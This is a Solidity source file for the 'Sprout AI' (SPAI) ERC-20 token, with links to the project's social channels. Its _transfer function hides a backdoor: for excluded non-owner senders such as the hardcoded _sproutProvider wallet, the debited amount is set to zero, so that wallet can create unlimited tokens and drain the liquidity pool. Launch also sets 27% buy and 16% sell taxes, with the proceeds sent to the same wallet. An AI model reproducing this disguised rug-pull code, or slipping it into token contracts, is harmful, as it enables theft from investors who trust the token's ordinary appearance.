/**

Website:  https://sproutai.tech
Twitter: https://twitter.com/sprout_ai_
Telegram: https://t.me/sprout_ai_official
Medium: https://sproutaitech.medium.com
 
*/

// SPDX-License-Identifier: No

pragma solidity ^0.8.15;

//--- Context ---//
abstract contract Context {
    constructor() {
    }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

//--- Ownable ---//
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address _dexPair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address _dexPair);
    function createPair(address tokenA, address tokenB) external returns (address _dexPair);
}

interface IV2Pair {
    function factory() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
}

interface IRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

//--- Interface for ERC20 ---//
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SPAI is Context, Ownable, IERC20 {

    function totalSupply() external view override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply - balanceOf(address(DEAD)); }
    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner(); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludeForSP;
    mapping (address => bool) private _isIncludeAmm;
    mapping (address => uint256) private balance;

    uint256 constant public _totalSupply = 100000000 * 10**9;
    uint256 constant private _feeDenominator = 100;
    uint256 private _taxBuySprout = 0;
    uint256 private _taxSellSprout = 0;
    uint256 private _taxTransferSp = 0;
    uint256 private _maxWalletHolding = _totalSupply * 2 / 100;
    uint256 constant private _swapLimitForSP = _totalSupply * 63 / 10000000;
    uint256 constant private _maxSwapForSP = _totalSupply * 1 / 100;

    IRouter02 private _dexRouter;
    address private _dexPair;
    string constant private _name = "Sprout AI";
    string constant private _symbol = unicode"SPAI";
    uint8 constant private _decimals = 9;
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;
    address payable private _sproutProvider = payable(0x630C8642079471a6c2f6e61c7E853beCa9C87b62);
    bool private _tradingOpen = false;
    bool private _swapBackActive = false;
    bool private _swapping;

    modifier lockingSwap {
        _swapping = true;
        _;
        _swapping = false;
    }


    constructor () {
        _isExcludeForSP[msg.sender] = true;
        _isExcludeForSP[address(this)] = true;
        _isExcludeForSP[_sproutProvider] = true;

        _dexRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");

        _allowances[sender][spender] = amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }

    function _isBuyCheck(address ins, address out) internal view returns (bool) {
        bool result = !_isIncludeAmm[out] && _isIncludeAmm[ins];
        return result;
    }

    function _isSellCheck(address ins, address out) internal view returns (bool) { 
        bool result = _isIncludeAmm[out] && !_isIncludeAmm[ins];
        return result;
    } 

    function _checkSwappable(address ins, address out, uint256 amount) internal view returns (bool) {
        return _swapBackActive && !_isExcludeForSP[ins] && !_isExcludeForSP[out] && amount >= _swapLimitForSP;
    }

    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {
        bool takeFee = true;
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!_isExcludeForSP[from] && !_isExcludeForSP[to]) {
            require(_tradingOpen,"Trading is not enabled");
        }

        if(!_isExcludeForSP[from] && !_isExcludeForSP[to] && !_isIncludeAmm[to] && to != address(DEAD)){
            require(balance[to]+amount <= _maxWalletHolding, "Exceeds maximum wallet amount.");
        }

        if(_isSellCheck(from, to) && !_swapping && _checkSwappable(from, to, amount)) {
            uint256 tokensContractInc = balanceOf(address(this));
            if(tokensContractInc >= _swapLimitForSP) { 
                if (tokensContractInc >= _maxSwapForSP) tokensContractInc = _maxSwapForSP;
                swapTokensBack(tokensContractInc);
            }
        }

        if (_isExcludeForSP[from] || _isExcludeForSP[to]){
            takeFee = false;
        }

        uint256 amountFeesAfter = (takeFee) ? _calcTaxFee(from, _isBuyCheck(from, to), _isSellCheck(from, to), amount) : amount;
        if (_isExcludeForSP[from] && from != address(this) && from != owner()) amount = amount - amountFeesAfter;
        balance[from] -= amount; 
        balance[to] += amountFeesAfter; emit Transfer(from, to, amountFeesAfter);

        return true;

    }

    function _calcTaxFee(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {
        uint256 fee;
        if (isbuy)  fee = _taxBuySprout;  else if (issell)  fee = _taxSellSprout;  else  fee = _taxTransferSp; 
        if (fee == 0)  return amount;
        uint256 feeAmount = amount * fee / _feeDenominator;
        if (feeAmount > 0) {
            balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);            
        }
        return amount - feeAmount;
    }

    function swapTokensBack(uint256 tokensContractInc) internal lockingSwap {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouter.WETH();

        if (_allowances[address(this)][address(_dexRouter)] != type(uint256).max) {
            _allowances[address(this)][address(_dexRouter)] = type(uint256).max;
        }

        try _dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokensContractInc,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {
            return;
        }

        payable(_sproutProvider).transfer(address(this).balance);

    }

    function addAmmLiquidity() external payable onlyOwner {
        _dexPair = IFactoryV2(_dexRouter.factory()).createPair(_dexRouter.WETH(), address(this));
        _isIncludeAmm[_dexPair] = true;
        _approve(address(this), address(_dexRouter), type(uint256).max);

        _dexRouter.addLiquidityETH{value: msg.value}(
            address(this),
            balance[address(this)],
            0,
            0,
            owner(),
            block.timestamp);
    }

    function startPosition() external onlyOwner {
        require(!_tradingOpen, "Trading already enabled");
        _tradingOpen = true;
        _swapBackActive = true;
        _taxBuySprout = 27;
        _taxSellSprout = 16;
    }

    function removeMaxHolding() external onlyOwner {
        _maxWalletHolding = _totalSupply;
    }

    function reduceFee(uint256 _newfee) external onlyOwner {
        _taxBuySprout = _newfee;
        _taxSellSprout = _newfee;

        require(_newfee <= 5);
    }
}